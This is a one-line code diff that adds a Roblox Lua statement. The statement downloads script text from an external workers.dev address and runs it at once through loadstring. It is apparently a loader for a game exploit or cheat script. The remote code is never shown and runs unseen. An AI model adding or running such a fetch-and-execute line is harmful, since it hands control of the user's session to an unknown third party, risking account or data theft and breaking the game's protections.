@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://deltap.nextgenscript.workers.dev/", true))()
